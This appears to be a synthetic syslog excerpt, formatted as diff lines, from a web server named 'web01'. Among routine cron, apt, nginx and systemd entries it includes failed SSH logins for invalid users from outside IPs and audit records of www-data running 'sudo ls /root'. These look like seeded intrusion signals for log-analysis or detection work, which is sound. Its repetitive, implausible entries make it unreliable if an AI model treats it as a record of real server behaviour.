+Aug 20 03:09:07 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:09:08 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:09:12 web01 CRON[881]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:09:17 web01 apt[2780]: Cache clean: removing index files
+Aug 20 03:09:19 web01 CRON[774]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:09:24 web01 sshd[1352]: Failed password for invalid user test from 185.220.101.17 port 49958 ssh2 event=LOGIN_FAILED
+Aug 20 03:09:29 web01 apt[2959]: Cache clean: removing index files
+Aug 20 03:09:30 web01 avahi-daemon[428]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:09:33 web01 nginx[2967]: 200 0.755 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:09:34 web01 dbus-daemon[1414]: systemd-logind: New session started
+Aug 20 03:09:37 web01 postfix/smtpd[2903]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:09:43 web01 dbus-daemon[529]: systemd-logind: New session started
+Aug 20 03:09:44 web01 apt[3509]: Cache clean: removing index files
+Aug 20 03:09:45 web01 systemd[1]: Rotate log files.
+Aug 20 03:09:50 web01 sshd[1451]: Failed password for invalid user test from 185.158.106.77 port 60578 ssh2 event=LOGIN_FAILED
+Aug 20 03:09:54 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:09:57 web01 sshd[1397]: Accepted publickey for ubuntu from 10.0.3.11 port 52668 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:09:58 web01 CRON[924]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:10:04 web01 CRON[713]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:10:07 web01 postfix/smtpd[3051]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 03:10:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:10:15 web01 dbus-daemon[578]: systemd-logind: New session started
+Aug 20 03:10:20 web01 CRON[895]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:10:21 web01 systemd[1]: Rotate log files.
+Aug 20 03:10:26 web01 nginx[2616]: 200 0.423 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:10:29 web01 NetworkManager[971]: DHCPv4 lease renewed on eth0
+Aug 20 03:10:30 web01 sshd[1170]: Accepted publickey for deploy from 10.0.4.17 port 50211 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:10:35 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 03:10:39 web01 nginx[2209]: 200 0.266 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:10:41 web01 CRON[912]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:10:43 web01 avahi-daemon[636]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:10:48 web01 NetworkManager[1138]: DHCPv4 lease renewed on eth0
+Aug 20 03:10:55 web01 sshd[1139]: Accepted publickey for ubuntu from 10.0.5.44 port 57544 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:10:56 web01 avahi-daemon[358]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:11:00 web01 nginx[2742]: 200 0.807 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:11:02 web01 avahi-daemon[655]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:11:07 web01 apt[3200]: Cache clean: removing index files
+Aug 20 03:11:09 web01 NetworkManager[629]: DHCPv4 lease renewed on eth0
+Aug 20 03:11:15 web01 avahi-daemon[463]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 03:11:17 web01 audit[2918]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:11:19 web01 nginx[2266]: 200 0.314 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:11:20 web01 sshd[1496]: Failed password for invalid user admin from 45.155.23.87 port 40616 ssh2 event=LOGIN_FAILED
+Aug 20 03:11:24 web01 apt[2587]: Cache clean: removing index files
+Aug 20 03:11:26 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:11:30 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:11:31 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:11:38 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:11:43 web01 CRON[747]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:11:49 web01 nginx[2298]: 200 0.192 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:11:56 web01 apt[3068]: Cache clean: removing index files
+Aug 20 03:12:01 web01 nginx[3025]: 200 0.264 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:12:08 web01 apt[2995]: Cache clean: removing index files
+Aug 20 03:12:13 web01 systemd[1]: Rotate log files.
+Aug 20 03:12:20 web01 systemd[1]: Rotate log files.
+Aug 20 03:12:25 web01 CRON[946]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:12:28 web01 CRON[949]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 03:12:34 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 03:12:39 web01 audit[1601]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 03:12:45 web01 systemd[1]: Rotate log files.
+Aug 20 03:12:51 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 03:12:58 web01 nginx[2868]: 200 0.488 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 03:13:00 web01 sshd[1260]: Accepted publickey for deploy from 10.0.5.23 port 62474 ssh2 event=LOGIN_SUCCESS
+Aug 20 03:13:01 web01 sshd[1490]: Failed password for invalid user user from 185.92.220.41 port 56246 ssh2 event=LOGIN_FAILED
+Aug 20 03:13:04 web01 NetworkManager[1170]: DHCPv4 lease renewed on eth0
+Aug 20 03:13:10 web01 systemd[1]: Started Daily apt download activities.
